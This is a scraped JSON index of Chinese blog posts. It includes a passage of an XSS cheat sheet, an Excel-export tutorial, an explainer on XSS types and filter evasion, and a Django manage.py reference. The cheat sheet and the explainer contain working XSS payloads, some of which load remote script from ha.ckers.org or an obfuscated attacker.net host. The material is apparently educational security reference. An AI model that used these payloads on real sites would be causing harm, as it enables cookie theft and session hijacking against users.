(用户或攻击者需要改变一个元素的属性) 77. onReadyStateChange() (用户或攻击者需要改变一个元素的属性) 78. onRedo() (用户执行再执行操作) 79. onRepeat() (the event fires once for each repetition of the timeline, excluding the first full cycle) 80. onReset() (用户或攻击者重置表单) 81. onResize() (用户调整窗口大小，或是攻击者自动触发通过某些代码例如\u0026amp;#x3C;SCRIPT\u0026gt;self.resizeTo(500,400);\u0026amp;#x3C;/SCRIPT\u0026gt;) 82. onResizeEnd() (用户调整窗口大小，或是攻击者自动触发通过某些代码例如\u0026amp;#x3C;SCRIPT\u0026gt;self.resizeTo(500,400);\u0026amp;#x3C;/SCRIPT\u0026gt;) 83. onResizeStart() (用户调整窗口大小，或是攻击者自动触发通过某些代码例如\u0026amp;#x3C;SCRIPT\u0026gt;self.resizeTo(500,400);\u0026amp;#x3C;/SCRIPT\u0026gt;) 84. onResume() (当元素从暂停恢复到激活时触发,包括body元素) 85. onReverse() (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward) 86. onRowsEnter() (用户或攻击者需要改变数据源中的一行) 87. onRowExit() (用户或攻击者需要改变数据源中的一行) 88. onRowDelete() (用户或攻击者需要删除数据源中的一行) 89. onRowInserted() (用户或攻击者需要向数据源中插入一行) 90. onScroll() (用户需要滚动,或是攻击者可以执行scrollBy() 函数) 91. onSeek() (媒体播放移动到新位置) 92. onSelect() (用户需要去选择一些文本 - 攻击者可以自动运行利用某些方法例如 window.document.execCommand(\u0026#34;SelectAll\u0026#34;);) 93. onSelectionChange() (用户需要去选择一些文本 - 攻击者可以自动运行利用某些方法例如 window.document.execCommand(\u0026#34;SelectAll\u0026#34;);) 94. onSelectStart() (用户需要去选择一些文本 - 攻击者可以自动运行利用某些方法例如 window.document.execCommand(\u0026#34;SelectAll\u0026#34;);) 95. onStart() (当marquee元素循环开始时触发) 96. onStop() (用户需要点击停止按钮或是离开网页) 97. onStorage() (存储区域改变) 98. onSyncRestored() (user interrupts the element\u0026#39;s ability to play its media as defined by the timeline to fire) 99. onSubmit() (需要攻击者或用户提交表单) 100. onTimeError() (用户或攻击者需要设置一个时间属性例如 dur 的值为无效的值) 101. onTrackChange() (用户或攻击者需要改变播放列表的轨迹) 102. onUndo() (user went backward in undo transaction history) 103. onUnload() (当用户点击一个链接或是按下回车键或是攻击者触发一个点击事件) 104. onURLFlip() (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file) 105. seekSegmentTime() (this is a method that locates the specified point on the element\u0026#39;s segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.) 6. 利用CSS跨站解析 1 \u0026lt;LINK REL=\u0026#34;stylesheet\u0026#34; HREF=\u0026#34;http://ha.ckers.org/xss.css\u0026#34;\u0026gt; 1 \u0026lt;STYLE\u0026gt;@import\u0026#39;http://ha.ckers.org/xss.css\u0026#39;;\u0026lt;/STYLE\u0026gt; 1 \u0026lt;META HTTP-EQUIV=\u0026#34;Link\u0026#34; Content=\u0026#34;\u0026lt;http://ha.ckers.org/xss.css\u0026gt;; REL=stylesheet\u0026#34;\u0026gt; 1 \u0026lt;STYLE\u0026gt;BODY{-moz-binding:url(\u0026#34;http://ha.ckers.org/xssmoz.xml#xss\u0026#34;)}\u0026lt;/STYLE\u0026gt; 1 \u0026lt;STYLE\u0026gt;@im\\port\u0026#39;\\ja\\vasc\\ript:alert(\u0026#34;XSS\u0026#34;)\u0026#39;;\u0026lt;/STYLE\u0026gt; 1 \u0026lt;IMG STYLE=\u0026#34;xss:expr/*XSS*/ession(alert(\u0026#39;XSS\u0026#39;))\u0026#34;\u0026gt; 1 \u0026lt;STYLE\u0026gt;.XSS{background-image:url(\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34;);}\u0026lt;/STYLE\u0026gt;\u0026lt;A CLASS=XSS\u0026gt;\u0026lt;/A\u0026gt; 1 2 exp/*\u0026lt;A STYLE=\u0026#39;no\\xss:noxss(\u0026#34;*//*\u0026#34;); xss:ex/*XSS*//*/*/pression(alert(\u0026#34;XSS\u0026#34;))\u0026#39;\u0026gt; 1 \u0026lt;STYLE TYPE=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#39;XSS\u0026#39;);\u0026lt;/STYLE\u0026gt; 1 \u0026lt;STYLE type=\u0026#34;text/css\u0026#34;\u0026gt;BODY{background:url(\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34;)}\u0026lt;/STYLE\u0026gt; 1 \u0026lt;XSS STYLE=\u0026#34;behavior: url(xss.htc);\u0026#34;\u0026gt; 1 \u0026lt;META HTTP-EQUIV=\u0026#34;refresh\u0026#34; CONTENT=\u0026#34;0;url=javascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; 1 \u0026lt;DIV STYLE=\u0026#34;background-image: url(javascript:alert(\u0026#39;XSS\u0026#39;))\u0026#34;\u0026gt; 1 \u0026lt;STYLE\u0026gt;li {list-style-image: url(\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34;);}\u0026lt;/STYLE\u0026gt;\u0026lt;UL\u0026gt;\u0026lt;LI\u0026gt;XSS\u0026lt;/br\u0026gt; 7. 扰乱过滤规则 1 \u0026lt;IMG SRC=\u0026#34; \u0026amp;#14; javascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; 1 \u0026lt;SCRIPT/SRC=\u0026#34;http://ha.ckers.org/xss.js\u0026#34;\u0026gt;\u0026lt;/SCRIPT\u0026gt; 1 \u0026lt;BODY onload!#$%\u0026amp;()*~+-_.,:;?@[/|\\]^`=alert(\u0026#34;XSS\u0026#34;)\u0026gt; 1 \u0026lt;\u0026lt;SCRIPT\u0026gt;alert(\u0026#34;XSS\u0026#34;);//\u0026lt;\u0026lt;/SCRIPT\u0026gt; 1 \u0026lt;SCRIPT SRC=http://ha.ckers.org/xss.js?\u0026lt; B \u0026gt; 1 \u0026lt;DIV STYLE=\u0026#34;width: expression(alert(\u0026#39;XSS\u0026#39;));\u0026#34;\u0026gt; 1 2 3 \u0026lt;!--[if gte IE 4]\u0026gt; \u0026lt;SCRIPT\u0026gt;alert(\u0026#39;XSS\u0026#39;);\u0026lt;/SCRIPT\u0026gt; \u0026lt;![endif]--\u0026gt; 1 \u0026lt;BASE HREF=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;);//\u0026#34;\u0026gt; 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt;z=’document.’\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;z=z+’write(“‘\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;z=z+’\u0026lt;script’\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;z=z+’ src=ht’\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;z=z+’tp://ww’\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;z=z+’w.attacker’\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;z=z+’.net/xss.’\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;z=z+’js\u0026gt;\u0026lt;/sc’\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;z=z+’ript\u0026gt;”)’\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;eval_r(z)\u0026lt;/script\u0026gt; 1 \u0026lt;IMG SRC=`javascript:alert(\u0026#34;RSnake says, \u0026#39;XSS\u0026#39;\u0026#34;)`\u0026gt; 1 \u0026lt;IMG \u0026#34;\u0026#34;\u0026#34;\u0026gt;\u0026lt;SCRIPT\u0026gt;alert(\u0026#34;XSS\u0026#34;)\u0026lt;/SCRIPT\u0026gt;\u0026#34;\u0026gt; 1 \u0026#34;\u0026lt;SCRIPT\\s\u0026#34; != \u0026#34;\u0026lt;SCRIPT/XSS\\s\u0026#34; 1 \u0026lt;SCRIPT/XSS SRC=\u0026#34;http://ha.ckers.org/xss.js\u0026#34;\u0026gt;\u0026lt;/SCRIPT\u0026gt; 1 ¼script¾alert(¢XSS¢)¼/script¾ 8. 参考 vector example 1 vector example 2 vector example 3 ","description":"","id":556,"section":"post","tags":["整理","安全","XSS"],"title":"XSS Cheat Sheet","uri":"https://www.chenshaowen.com/blog/xss-cheat-sheet.html"},{"content":" 在Web开发中，常会遇到数据导出的需求。这篇主要介绍如何快速将数据导出，并保存为Excel文件。\n1. 前端 Web开发中，格式化数据常以table的形式展示。下面是一个人员薪酬信息表，以导出这份数据为例。\n姓名 职位 年龄 薪水 Tiger NixonTiger Nixon System Architect 61 $320,800 Garrett Winters Accountant 63 $170,750 Ashton Cox Junior Technical Author 66 $86,000 Cedric Kelly Senior Javascript Developer 22 $433,060 Herrod Chandler Sales Assistant 59 $327,900 1.1 tableExport tableExport是一个表格导出Jquery插件，支持导出格式：JSON、XML、PNG、CSV、TXT、SQL、MS-Word、Ms-Excel、Ms-Powerpoint、PDF。\n需要注意的是，如果表头有中文，原项目中的 jquery.base64.js，会报错：Uncaught INVALID_CHARACTER_ERR: DOM Exception 5 VM2832 jquery.base64.js:136，需要更新。推荐 jQuery 官网插件，前往。tableExport原生项目对中文数据导出并不友好。\n引入js 1 2 \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;tableExport.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;jquery.base64.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 导出PNG 1 \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;html2canvas.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 导出PDF 1 2 3 \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;jspdf/libs/sprintf.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;jspdf/jspdf.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;jspdf/libs/base64.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 使用方法 直接调用插件的tableExport方法，设置导出类型即可。建议escape设置为true，否则中文会有乱码。\n1 2 3 4 5 6 7 8 \u0026lt;script src=\u0026#39;js/jquery.base64.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#39;js/tableExport.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; function tableexport_export(){ $(\u0026#39;#tableID\u0026#39;).tableExport({type:\u0026#39;excel\u0026#39;,excape:\u0026#39;true\u0026#39;}); } \u0026lt;/script\u0026gt; \u0026lt;button onClick=\u0026#34;tableexport_export()\u0026#34;\u0026gt;tableExport导出Excel\u0026lt;/button\u0026gt; 1.2 kendoGrid Kendo UI 是一个用于快速开发 HTML5 UI 的强大框架。基于 HTML5、CSS3和JavaScript标准。Kendo UI 包含了开发现代 JavaScript 开发所需要的所有一切，包括：强大的数据源，通用的拖拉（Drag-and-Drop）功能，模板，和UI控件。kendoGrid 支持将表格数据导出为 Excel 文件，只需简单配置一下即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;div id=\u0026#34;kendogrid_table\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;styles/kendo.common.min.css\u0026#34;/\u0026gt; \u0026lt;script src=\u0026#39;js/kendo.all.min.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#39;js/jszip.min.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; $(document).ready(function() { $(\u0026#39;#tableID\u0026#39;).kendoGrid({ pageable: false, sortable: true, dataSource: [ {\u0026#39;name\u0026#39;: \u0026#39;Tiger Nixon\u0026#39;, \u0026#39;position\u0026#39;: \u0026#39;System Architect\u0026#39;, \u0026#39;age\u0026#39;: \u0026#39;61\u0026#39;, \u0026#39;salary\u0026#39;: \u0026#39;$320,800\u0026#39;}, {\u0026#39;name\u0026#39;: \u0026#39;Garrett Winters\u0026#39;, \u0026#39;position\u0026#39;: \u0026#39;Accountant\u0026#39;, \u0026#39;age\u0026#39;: \u0026#39;63\u0026#39;, \u0026#39;salary\u0026#39;: \u0026#39;$170,750\u0026#39;}, {\u0026#39;name\u0026#39;: \u0026#39;Ashton Cox\u0026#39;, \u0026#39;position\u0026#39;: \u0026#39;Junior Technical Author\u0026#39;, \u0026#39;age\u0026#39;: \u0026#39;66\u0026#39;, \u0026#39;salary\u0026#39;: \u0026#39;$86,000\u0026#39;}, {\u0026#39;name\u0026#39;: \u0026#39;Cedric Kelly\u0026#39;, \u0026#39;position\u0026#39;: \u0026#39;Senior Javascript Developer\u0026#39;, \u0026#39;age\u0026#39;: \u0026#39;22\u0026#39;, \u0026#39;salary\u0026#39;: \u0026#39;$433,060\u0026#39;}, {\u0026#39;name\u0026#39;: \u0026#39;Herrod Chandler\u0026#39;, \u0026#39;position\u0026#39;: \u0026#39;Sales Assistant\u0026#39;, \u0026#39;age\u0026#39;: \u0026#39;59\u0026#39;, \u0026#39;salary\u0026#39;: \u0026#39;\t$137,500\u0026#39;}, {\u0026#39;name\u0026#39;: \u0026#39;Rhona Davidson\u0026#39;, \u0026#39;position\u0026#39;: \u0026#39;Integration Specialist\u0026#39;, \u0026#39;age\u0026#39;: \u0026#39;55\u0026#39;, \u0026#39;salary\u0026#39;: \u0026#39;$327,900\u0026#39;}, ], toolbar: [\u0026#39;excel\u0026#39;], columns: [ { field: \u0026#39;name\u0026#39;, title: \u0026#39;姓名\u0026#39; }, { field: \u0026#39;position\u0026#39;, title: \u0026#39;职位\u0026#39; }, { field: \u0026#39;age\u0026#39;, title: \u0026#39;年龄\u0026#39; }, { field: \u0026#39;salary\u0026#39;, title: \u0026#39;薪水\u0026#39; } ] }) }); 1.3 DataTables kendoGrid是一款商业的前端表格工具，使用上收到一定限制。如果项目组允许使用DataTables这款表格工具，那么也不错。DataTabels同样也提供丰富的工具，用于数据的导出。\n需要注意的是，如果表格数据中存在特殊字符，比如$，需要customizeData函数特殊处理一下，否则导出数据会出现乱码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;extensions/Buttons/css/buttons.dataTables.min.css\u0026#34;/\u0026gt; \u0026lt;script src=\u0026#39;js/jquery.dataTables.min.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#39;js/dataTables.buttons.min.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;extensions/Buttons/js/buttons.html5.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; $(document).ready(function () { $(\u0026#39;#tableID\u0026#39;).DataTable({ dom: \u0026#39;Bfrtip\u0026#39;, buttons: [{ \u0026#39;extend\u0026#39;: \u0026#39;excel\u0026#39;, \u0026#39;text\u0026#39;: \u0026#39;导出\u0026#39;,//定义导出excel按钮的文字 customizeData: function (data) { for (var i = 0; i \u0026lt; data.body.length; i++) { for (var j = 0; j \u0026lt; data.body[i].length; j++) { data.body[i][j] = \u0026#39;\\u200C\u0026#39; + data.body[i][j]; } } } }], paging: true, //隐藏分页 ordering: false, //关闭排序 info: false, //隐藏左下角分页信息 searching: false, //关闭搜索 lengthChange: false, }); }); \u0026lt;/script\u0026gt; 2. 后端 当数据量很大时，后台分页，前端就无法导出完整的数据。这时，可以采用后端数据导出，这里以Django为例，直接给前端返回excel文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 # coding=utf-8 from django.http import HttpResponse import xlwt def get_export_excel_response(dic_data_list, filename=\u0026#39;export\u0026#39;): \u0026#39;\u0026#39;\u0026#39; :param dic_data_list = [{ u\u0026#34;数据1\u0026#34;: randint(0, 999), u\u0026#34;数据2\u0026#34;: randint(0, 999), u\u0026#34;数据3\u0026#34;: randint(0, 999), u\u0026#34;数据4\u0026#34;: randint(0, 999), u\u0026#34;数据5\u0026#34;: randint(0, 999), u\u0026#34;数据6\u0026#34;: randint(0, 999), u\u0026#34;数据7\u0026#34;: randint(0, 999), u\u0026#34;数据8\u0026#34;: randint(0, 999), },{ ...... }]: :param filename: 文件名 :return: HttpResponse excel文件 \u0026#39;\u0026#39;\u0026#39; head_list = dic_data_list[0].keys() if dic_data_list else [] # 创建excel表 excel = xlwt.Workbook(encoding=\u0026#39;utf-8\u0026#39;, style_compression=2) worksheet = excel.add_sheet(filename) # 写入表头 for col in range(0, len(head_list)): worksheet.col(col).width = 256 * 20 worksheet.write(0, col, head_list[col], set_style(\u0026#39;Times New Roman\u0026#39;, 220, True)) # 写入数据 for row in range(1, len(dic_data_list) + 1): for col, single_head in enumerate(head_list): worksheet.write(row, col, dic_data_list[row - 1][single_head], right()) response = HttpResponse(content_type=\u0026#34;application/ms-excel\u0026#34;) filename = filename.encode(\u0026#39;utf-8\u0026#39;) response[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment;filename=%s.xls\u0026#39; % filename excel.save(response) return response def set_style(name, height, bold=False): style = xlwt.XFStyle() # 初始化样式 font = xlwt.Font() # 为样式创建字体 font.name = name # \u0026#39;Times New Roman\u0026#39; font.bold = bold # 是否粗体 font.color_index = 4 font.height = height al = xlwt.Alignment() al.horz = xlwt.Alignment.HORZ_CENTER # 设置水平居中 al.vert = xlwt.Alignment.VERT_CENTER # 设置垂直居中 al.wrap = xlwt.Alignment.WRAP_AT_RIGHT # 设置文字可以换行 style.alignment = al style.font = font # style.borders = borders return style def right(): style = xlwt.XFStyle() # 初始化样式 al = xlwt.Alignment() al.horz = xlwt.Alignment.HORZ_RIGHT # 设置水平靠右 al.vert = xlwt.Alignment.VERT_CENTER # 设置垂直居中 al.wrap = xlwt.Alignment.WRAP_AT_RIGHT # 设置文字可以换行 style.alignment = al return style 3. 参考 tableExport.jquery.plugin项目地址 DataTables主页 datatables.net导出格式设置 KendoUI文档页 ","description":"","id":557,"section":"post","tags":["Django","前端","数据","Demo","博文"],"title":"Web开发中快速导出Excel文件(附代码)","uri":"https://www.chenshaowen.com/blog/how-to-export-excel-quickly-in-web-development.html"},{"content":" XSS是一种在前端执行JavaScript脚本的攻击方式。随着UGC站点的流行，用户产生数据剧增，数据块的网络连接越来越有利于XSS的实施与传播。XSS带来的危害有：窃取用户cookies，窃取个人信息；劫持会话，操纵用户网络数据；发起ddos攻击; 篡改页面、弹出广告等。\n1. 名词解释 XSS。\n全称Cross Site Script，跨站脚本攻击。 XSS向量。\n通常将，一段用于XSS攻击的代码片段称之为XSS向量。比如： 1 \u0026lt;script\u0026gt;alert(/This is a xss test!/)\u0026lt;/script\u0026gt; XSS Filter。\n即跨站脚本过滤器。用于分析用户输入和提交的数据，消除潜在的XSS、恶意的HTML或简单的HTML格式错误。一般，XSS Filter是基于黑白名单的安全过滤策略实施的。比如，仅允许特定的输入字符，或仅阻止特定的输入字符。 2. XSS原理 所有来自COOKIE、POST表单、GET请求、HTTP头的内容都可能是XSS攻击的入口。\n下面以窃取cookie为例，描述XSS的攻击链路。\n2.1 反射型XSS 反射型XSS是一种最常见的XSS方式。XSS向量，通常附加在URL中，诱导用户点击。\n攻击链路：\n攻击者精心构造一个包含恶意字符串的 URL，将其发送给受害者 攻击者欺骗受害者，使其访问该 URL 网站在响应中包含了来自 URL 的恶意字符串 受害者浏览器执行了响应中的恶意字符串，将自己的 cookie 发送到了攻击者的服务器 2.2 存储型XSS 存储型XSS是一种危害很大的XSS方式。通过表单等输入，提交XSS向量，存入数据库。在信息的输出页面，执行XSS向量。在UGC站点，存储型XSS传播速度很快，如果不及时制止，会产生很大影响。\n攻击链路：\n攻击者利用网站的表单插入恶意字符串到网站数据库 受害者请求网站页面 网站在响应中包含来自数据库的恶意字符串，并返回给受害者 受害者的浏览器执行了响应中的恶意字符串，将受害者的 cookie 发送到了攻击者的服务器 2.3 DOM Based XSS DOM Based XSS，是通过修改受害者浏览器中的DOM环境，来执行攻击的。也就是说，页面响应不会更改，但是由于DOM环境中发生的恶意修改，页面中攻击脚本能够被执行。\n攻击链路：\n攻击者构造一个包含恶意字符串的 URL，将其发送给受害者。 攻击者欺骗受害者，使其访问了该 URL 网站接收到响应，但是响应中并不包含恶意字符串 受害者浏览器执行响应中合法的 JavaScript，导致恶意代码插入到了页面中 受害者浏览器执行插入到页面中的恶意代码，将 cookie 发送到了攻击者的服务器 2.4 MXSS 突变XSS，浏览器的解析引擎将一段没有威胁的代码渲染成具有威胁的XSS攻击代码，攻击代码可能被js或是其他流程输出到DOM中或是在其他地方被再次渲染导致XSS的执行。这种XSS利用方式具有很强的攻击性。\n攻击链路：\n攻击者精心构造一个包含非敏感字符串的URL，将其发送给受害者 攻击者欺骗受害者，使其访问该 URL 网站在响应中包含了来自URL的字符串 浏览器将响应中的非敏感字符串，渲染成可执行的XSS攻击代码。 受害者浏览器执行了响应中的恶意字符串，将自己的 cookie 发送到了攻击者的服务器 2.5 UXSS 浏览器通用型XSS，利用浏览器或浏览器插件漏洞来构造XSS。不同于其他XSS方式，只能获取同源（同协议、同域名、同端口）信息。UXSS能够对没有漏洞的页面发起攻击。\n3. XSS构造方式 这里列出了七种方法：\n3.1 利用\u0026lt;\u0026gt;标记注入HTML/JavaScript 如果能够引入\u0026lt;\u0026gt;标记，可以直接构造JavaScript编写的XSS向量，就可以成功注入。这部分的关键在于找到可以回显的输入点，闭合\u0026lt;之前的字符配对。\n1 \u0026lt;script\u0026gt;alert(/XSS/)\u0026lt;/script\u0026gt; 3.2 利用HTML标签属性执行XSS 很多HTML标记的属性都支持JavaScript:[code] 伪协议，这类特殊的协议由JavaScript的解释器运行，所以用户可以利用部分HTML标记的属性进行XSS。如下面的代码：\n1 2 \u0026lt;img src = \u0026#34;javascript:alert(/XSS1/);\u0026#34;\u0026gt; \u0026lt;table background = \u0026#34;javascript:alert(/XSS2/)\u0026#34;\u0026gt;\u0026lt;/table\u0026gt; 但并不是所有浏览器支持伪协议。\n3.3 利用空格、回车、Tab等分隔符 由于通常XSS Filter采取的黑名单策略，不一定将全部分隔符列为敏感字符。JavaScript语法中以下三种方式都能编写合法的语句：\n如果JavaScript引擎确定一个句子完成，而行尾有换行符，那么分号可以省略。 如果一行中有多个句子，那么每句都得用分号结束。 额外的空白无论以何种方式添加都可以，在构成一个完整的语句或遇到分号之前不会结束。\n这里就是利用了第三条，拆分敏感字符，绕过XSS Filter 1 2 3 \u0026lt;img src = \u0026#34;javas cript: alert(/XSS/)\u0026#34; width = \u0026#34;100\u0026#34;\u0026gt; 3.4 对标签的属性值转码 Web系统对于普通HTML标记的属性进行过滤，还可以通过编码处理来绕过。因为HTML中属性本身支持ASCII码形式。\n1 2 3 \u0026lt;img src = \u0026#34;javascript:alert(/XSS/);\u0026#34;\u0026gt; 替换成 \u0026lt;img src = \u0026#34;javascrip\u0026amp;#116\u0026amp;#58alert(/XSS/);\u0026#34;\u0026gt; 3.5 产生自己的事件 JavaScript与HTML之间的交互是通过事件来实现的，比如click、mouseover等动作触发事件处理函数执行。事件可以让javaScript执行，当然也可以用来执行XSS脚本。\n1 \u0026lt;img src = \u0026#34;#\u0026#34; onerror = alert(/XSS/)\u0026gt; 3.6 利用CSS跨站解析 XSS跨站脚本的另一个载体是CSS样式表，使用CSS样式表执行JavaScript具有隐蔽、灵活多变等特点，但是有一个很大的缺点是：各浏览器之间不能通用，甚至同一浏览器的不同版本之间都不能通用。使用CSS直接执行JavaScript代码的示例如下：\n1 \u0026lt;div style=\u0026#34;background-image: url(javascript:alert(\u0026#39;XSS\u0026#39;))\u0026#34;\u0026gt; 3.7 扰乱过滤规则 利用前面叙述的各种技巧，包括HTML标签属性值、事件、CSS、编码技术等，攻击者能顺利绕过XSS Filter的重重过滤。\n但是，开发者在开发过程中，可能也已经考虑到各种触发XSS的情况，让系统变得更加牢固安全。但是攻击者的手段是多种多样的，看看这些示例：\n一个正常的XSS输入：\n1 \u0026lt;img src = \u0026#34;javascript:alert(1);\u0026#34;\u0026gt; 转换大小写后的XSS：\n1 \u0026lt;IMG SRC = \u0026#34;javascript:alert(1);\u0026#34;\u0026gt; 大小写混淆的XSS：\n1 \u0026lt;ImG SRc = \u0026#34;jAVasCRIpT:AlerT(1);\u0026#34;\u0026gt; 不用双引号，而是使用单引号的XSS:\n1 \u0026lt;img src=\u0026#39;javascript:alert(0):\u0026#39;\u0026gt; 不使用引号的XSS:\n1 \u0026lt;img src=javascript:alert(0);\u0026gt; 其他:\n1 \u0026lt;img/src=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; 4. 参考 http://drops.xmd5.com/static/drops/tips-956.html http://www.secist.com/archives/1785.html http://www.contriver.me/xss-construction-method-conclusion/ https://segmentfault.com/a/1190000006904327 ","description":"","id":558,"section":"post","tags":["整理","安全","JavaScript","XSS"],"title":"XSS 原理、构造","uri":"https://www.chenshaowen.com/blog/principle-and-construction-of-xss.html"},{"content":" 每个Django项目中都会自动生成一个manage.py文件。manage.py是对django-admin的一个简单包装，其功能是将Django Project放到sys.path目录中，设置 DJANGO_SETTINGS_MODULE 环境变量为当前Project的setting.py 文件。也就是说django-admin与manage的差别在于，manage设置了项目的环境变量。\n1. 使用格式 1 2 django-admin [command] [options] manage.py [command] [options] 2. manage命令简介 2.1 创建项目 - startproject 1 manage startproject pro_name 2.2 创建app - startapp 1 manage startapp app_name 2.3 交互环境 - shell 1 manage shell 如果安装了 IPython 或 bpython ，将被指定为解释器接口。\n2.4 创建模型 - syncdb manage syncdb 2.5 启动服务器 - runserver manage runserver [IP地址 : 端口号] 本地启用一个轻量级的Web服务器\n2.6 确定你使用的版本 - version 1 manage version 2.7 检查 - check 默认情况下，所有应用都将被选中。\n1 python manage.py check 如果没有指定任何一个应用，那么将对全部的应用进行检查。\ntag 可以使用标记将执行的检查仅限于特定类别中的检查。例如，要仅执行安全性和兼容性检查，运行：\npython manage.py check \u0026ndash;tag security \u0026ndash;tag compatibility\nlist-tags 列出所有可用的标签\ndeploy 选项激活与部署相关的一些其他检查。\npython manage.py check \u0026ndash;deploy \u0026ndash;settings=production_settings\n2.8 清空数据库 - flush 1 manage flush database选项可用于指定要刷新的数据库。 no-initial-data\n使用\u0026ndash;no-initial-data可避免加载initial_data fixture。 2.9 反向生成模型 - inspectdb 1 manage inspectdb 2.10 数据模型 - validate 1 manage validate 2.11 创建缓存表　- createcachetable 1 manage createcachetable database选项可用于指定要安装缓存表的数据库 2.12 模型产生sql代码 - sql 1 manage sql 将app创建表的sql语句打印出来，并不是真的创建\n2.13 模型产生sql代码 - sqlall 1 manage sqlall 打印出所有的创建app的sql语句，包括索引\n2.14 数据库引擎命令行客户端 - dbshell 1 manage dbshell database选项可用于指定要在其上打开shell的数据库 2.15 创建超级管理员 - createsuperuser 1 manage createsuperuser 2.16 修改用户密码 - changepassword 1 manage changepassword username database选项指定要为用户查询的数据库 2.17 更新数据库修改 - migrate 1 manage.py makemigrations 更新migrations文件\n1 manage migrate 执行数据库脚本中的命令,将models层的修改同步到数据库\n2.18 现在配置与默认配置的差异 - diffsettings 1 manage diffsettings 显示现在的设置文件和默认的设置文件之间的差异\n2.19 导出数据库 - dumpdata 1 manage dumpdata format 默认情况下，dumpdata将以JSON格式输出其输出，但您可以使用\u0026ndash;format选项指定另一种格式。目前支持的格式列在Serialization formats中。 indent 默认情况下，dumpdata将在一行上输出所有数据。这对于人类来说不容易阅读，因此您可以使用\u0026ndash;indent选项来漂亮地打印具有多个缩进空格的输出。 exclude\n选项以防止特定应用或模型（以app_label.ModelName）。如果将模型名称指定为dumpdata，则转储的输出将限制为该模型，而不是整个应用程序。您还可以混合应用程序名称和型号名称。 database\n选项可用于指定要从中转储数据的数据库。 natural-foreign\nDjango将使用natural_key()模型方法将任何外键和多对多关系序列化到定义方法的类型的对象。 pks\n默认情况下，dumpdata将输出模型的所有记录，但您可以使用\u0026ndash;pks选项指定要过滤的主键的逗号分隔列表。这仅在转储一个模型时可用。 output\n缺省，dumpdata命令会将所有经序列化之后的数据输出到标准输出。使用\u0026ndash;output选项允许指定数据被写入的文件。 2.20 导入数据 - loaddata 1 manage loaddata database\n选项可用于指定要将数据加载到的数据库。 ignorenonexistent\n选项可用于忽略可能自灯具最初生成后移除的字段和模型。 app\n选项可用于指定单个应用程序来查找fixture，而不是浏览所有应用程序。 2.21 获取运行时帮助 - help 运行 manage help显示使用信息和每个应用的命令列表 运行 manage help \u0026ndash;commands显示一个包含所有可用命令的列表 运行 manage help 来显示某一个命令的描述及其可用的命令列表。 3. 从代码运行管理命令 django.core.management.call_command(name, *args, **options)\n1 2 3 4 5 6 7 from django.core.management import call_command call_command(\u0026#39;flush\u0026#39;, verbosity=0, interactive=False) call_command(\u0026#39;loaddata\u0026#39;, \u0026#39;test_data\u0026#39;, verbosity=0) call_command(\u0026#39;dumpdata\u0026#39;, \u0026#39;--natural-foreign\u0026#39;) call_command(\u0026#39;dumpdata\u0026#39;, exclude=[\u0026#39;contenttypes\u0026#39;, \u0026#39;auth\u0026#39;]) with 